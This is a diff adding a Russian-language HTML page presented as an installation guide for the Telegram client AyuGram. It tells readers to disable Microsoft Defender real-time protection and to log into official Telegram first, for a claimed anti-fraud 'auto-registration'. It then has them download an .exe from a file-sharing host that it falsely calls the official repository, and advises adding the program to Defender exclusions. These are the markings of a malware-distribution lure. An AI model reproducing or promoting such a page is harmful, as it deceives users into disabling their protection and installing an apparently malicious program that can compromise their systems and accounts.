@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Инструкция по установке Ayugram для Desktop</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #4361ee;
+            --primary-dark: #3a56d4;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --success: #10b981;
+            --bg: #f8fafc;
+            --card: #ffffff;
+            --text: #1e293b;
+            --text-light: #64748b;
+            --border: #e2e8f0;
+            --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.1);
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            --radius: 12px;
+            --transition: all 0.2s ease;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
+            color: var(--text);
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 2rem 1rem;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 0.5rem;
+            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .subtitle {
+            color: var(--text-light);
+            font-size: 1.1rem;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        .card {
+            background: var(--card);
+            border-radius: var(--radius);
+            padding: 1.75rem;
+            margin-bottom: 1.5rem;
+            box-shadow: var(--shadow-md);
+            border: 1px solid var(--border);
+            transition: var(--transition);
+        }
+        .card:hover {
+            box-shadow: var(--shadow-lg);
+            transform: translateY(-2px);
+        }
+        .warning-box {
+            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
+            border-left: 5px solid var(--warning);
+            padding: 1.25rem;
+            border-radius: var(--radius);
+            margin: 1.5rem 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 0.75rem;
+            color: #92400e;
+            font-weight: 500;
+        }
+        .warning-box i {
+            color: var(--warning);
+            font-size: 1.3rem;
+            margin-top: 0.1rem;
+        }
+        .info-box {
+            background: linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%);
+            border-left: 5px solid var(--primary);
+            padding: 1.25rem;
+            border-radius: var(--radius);
+            margin: 2rem 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 0.75rem;
+            color: #1e40af;
+            font-weight: 500;
+        }
+        .info-box i {
+            color: var(--primary);
+            font-size: 1.3rem;
+            margin-top: 0.1rem;
+        }
+        .steps {
+            counter-reset: step-counter;
+        }
+        .step {
+            counter-increment: step-counter;
+            display: flex;
+            gap: 1.25rem;
+            padding: 1.5rem;
+            background: var(--card);
+            border-radius: var(--radius);
+            margin-bottom: 1.25rem;
+            border: 1px solid var(--border);
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+        .step::before {
+            content: counter(step-counter);
+            background: var(--primary);
+            color: white;
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+            box-shadow: var(--shadow-sm);
+        }
+        .step:hover {
+            border-color: var(--primary);
+            box-shadow: var(--shadow-lg);
+        }
+        .step-content {
+            flex: 1;
+        }
+        .step h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: var(--text);
+        }
+        .step p {
+            color: var(--text-light);
+            margin-bottom: 0.75rem;
+        }
+        .image-container {
+            margin-top: 1rem;
+            text-align: center;
+            border-radius: var(--radius);
+            overflow: hidden;
+            box-shadow: var(--shadow-sm);
+            background: #f1f5f9;
+        }
+        .image-container img {
+            max-width: 100%;
+            height: auto;
+            border-radius: var(--radius);
+            transition: transform 0.3s ease;
+            display: block;
+        }
+        .image-container:hover img {
+            transform: scale(1.02);
+        }
+        .note {
+            background: linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%);
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            color: #1e40af;
+            margin-top: 0.75rem;
+            display: inline-block;
+        }
+        .install-section {
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 2px dashed var(--border);
+        }
+        .install-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.25rem;
+            margin-top: 1.5rem;
+        }
+        .install-card {
+            background: var(--card);
+            padding: 1.5rem;
+            border-radius: var(--radius);
+            border: 1px solid var(--border);
+            text-align: center;
+            transition: var(--transition);
+        }
+        .install-card:hover {
+            border-color: var(--primary);
+            box-shadow: var(--shadow-lg);
+        }
+        .install-card i {
+            font-size: 2.5rem;
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+        .install-card h4 {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+        .install-card p {
+            color: var(--text-light);
+            font-size: 0.95rem;
+        }
+        .btn {
+            display: inline-block;
+            background: var(--primary);
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 1rem;
+            transition: var(--transition);
+            box-shadow: var(--shadow-sm);
+            font-size: 1rem;
+        }
+        .btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-1px);
+            box-shadow: var(--shadow-md);
+        }
+        .btn i {
+            margin-right: 0.5rem;
+        }
+        footer {
+            text-align: center;
+            margin-top: 4rem;
+            padding: 2rem;
+            color: var(--text-light);
+            font-size: 0.9rem;
+            border-top: 1px solid var(--border);
+        }
+        .contact-line {
+            font-size: 1rem !important;
+            font-weight: 600 !important;
+            margin-top: 0.75rem !important;
+            color: var(--primary) !important;
+        }
+        .contact-line a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.05em;
+        }
+        .contact-line a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            .step {
+                flex-direction: column;
+            }
+            .step::before {
+                align-self: flex-start;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Инструкция по установке Ayugram</h1>
+            <p class="subtitle">Пошаговое руководство по отключению антивируса и установке Ayugram для Desktop</p>
+        </header>
+        <div class="warning-box">
+            <i class="fas fa-exclamation-triangle"></i>
+            <div>
+                <strong>Внимание:</strong> Отключение антивируса снижает защиту системы. Включайте его сразу после установки Ayugram.
+            </div>
+        </div>
+        <div class="card">
+            <h2 style="margin-bottom:1.5rem;color:var(--primary);">
+                <i class="fas fa-shield-alt" style="margin-right:.5rem;"></i>
+                Отключение антивируса (Microsoft Defender)
+            </h2>
+            <div class="steps">
+                <!-- ШАГ 1 -->
+                <div class="step">
+                    <div class="step-content">
+                        <h3>Откройте Параметры</h3>
+                        <p>Нажмите комбинацию клавиш <kbd>Win</kbd> + <kbd>I</kbd> или кликните на значок Windows в левом нижнем углу и выберите «Параметры».</p>
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/placeholder1.jpg" alt="Открытие параметров Windows">
+                        </div>
+                        <div class="note">
+                            <i class="fas fa-lightbulb"></i> Совет: Можно ввести «Параметры» в поиск Windows.
+                        </div>
+                    </div>
+                </div>
+                <!-- ШАГ 2 -->
+                <div class="step">
+                    <div class="step-content">
+                        <h3>Перейдите в «Обновление и безопасность»</h3>
+                        <p>В окне Параметры найдите и кликните по разделу «Обновление и безопасность».</p>
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/placeholder2.jpg" alt="Обновление и безопасность">
+                        </div>
+                    </div>
+                </div>
+                <!-- ШАГ 3 -->
+                <div class="step">
+                    <div class="step-content">
+                        <h3>Выберите «Безопасность Windows»</h3>
+                        <p>В левом меню кликните по пункту «Безопасность Windows».</p>
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/placeholder3.jpg" alt="Безопасность Windows">
+                        </div>
+                    </div>
+                </div>
+                <!-- ШАГ 4 -->
+                <div class="step">
+                    <div class="step-content">
+                        <h3>Откройте «Защита от вирусов и угроз»</h3>
+                        <p>В правой части окна кликните по плитке «Защита от вирусов и угроз».</p>
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/placeholder4.jpg" alt="Защита от вирусов и угроз">
+                        </div>
+                    </div>
+                </div>
+                <!-- ШАГ 5 -->
+                <div class="step">
+                    <div class="step-content">
+                        <h3>Перейдите в «Управление настройками»</h3>
+                        <p>Прокрутите вниз и кликните по ссылке «Управление настройками».</p>
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/placeholder5.jpg" alt="Управление настройками">
+                        </div>
+                    </div>
+                </div>
+                <!-- ШАГ 6 -->
+                <div class="step">
+                    <div class="step-content">
+                        <h3>Отключите «Защиту в реальном времени»</h3>
+                        <p>Найдите переключатель «Защита в режиме реального времени» и переведите его в положение <strong>Откл.</strong>. Подтвердите действие.</p>
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/placeholder6.jpg" alt="Отключение защиты в реальном времени">
+                        </div>
+                        <div class="note">
+                            <i class="fas fa-check-circle"></i> Антивирус временно отключён — можно устанавливать Ayugram.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- НОВЫЙ БЛОК: ПРЕДУПРЕЖДЕНИЕ ПЕРЕД УСТАНОВКОЙ -->
+        <div class="info-box">
+            <i class="fas fa-info-circle"></i>
+            <div>
+                <strong>Важно:</strong> Но перед скачиванием новой версии AyuGram тебе сначала нужно скачать официальную версию Telegram и зайти в свой аккаунт, чтобы прошла авторегистрация для защиты от мошенников.
+            </div>
+        </div>
+
+        <div class="install-section">
+            <div class="card">
+                <h2 style="margin-bottom:1.5rem;color:var(--primary);">
+                    <i class="fas fa-download" style="margin-right:.5rem;"></i>
+                    Установка Ayugram
+                </h2>
+                <div class="install-steps">
+                    <div class="install-card">
+                        <i class="fas fa-cloud-download-alt"></i>
+                        <h4>Скачайте файл</h4>
+                        <p>Скачайте установочный файл Ayugram с официального репозитория.</p>
+                        <a href="https://gofile.io/d/s5z5oA" target="_blank" class="btn">
+                            <i class="fas fa-download"></i> Скачать AyuGram.exe (168.76 МБ)
+                        </a>
+                    </div>
+                    <div class="install-card">
+                        <i class="fas fa-play-circle"></i>
+                        <h4>Запустите установщик</h4>
+                        <p>Откройте скачанный .exe файл и следуйте инструкциям мастера установки.</p>
+                    </div>
+                    <div class="install-card">
+                        <i class="fas fa-shield-alt"></i>
+                        <h4>Включите антивирус</h4>
+                        <p>После установки вернитесь в настройки и включите «Защиту в реальном времени».</p>
+                    </div>
+                </div>
+                <div class="warning-box" style="margin-top:1.5rem;">
+                    <i class="fas fa-info-circle"></i>
+                    <div>
+                        <strong>Совет:</strong> Если Defender блокирует Ayugram после установки — добавьте приложение в <strong>исключения</strong> в разделе «Защита от вирусов и угроз» → «Управление настройками» → «Исключения».
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer>
+            <p>Инструкция актуальна для Windows 11 • Обновлено: ноябрь 2025</p>
+            <p class="contact-line">
+                <i class="fas fa-headset"></i> По всем вопросам пишите <a href="https://t.me/ayugrammer" target="_blank">@ayugrammer</a>
+            </p>
+            <p style="margin-top:0.5rem;font-size:0.85rem;">
+                <i class="fas fa-code"></i> с любовью для сообщества Ayugram
+            </p>
+        </footer>
+    </div>
+</body>
+</html>
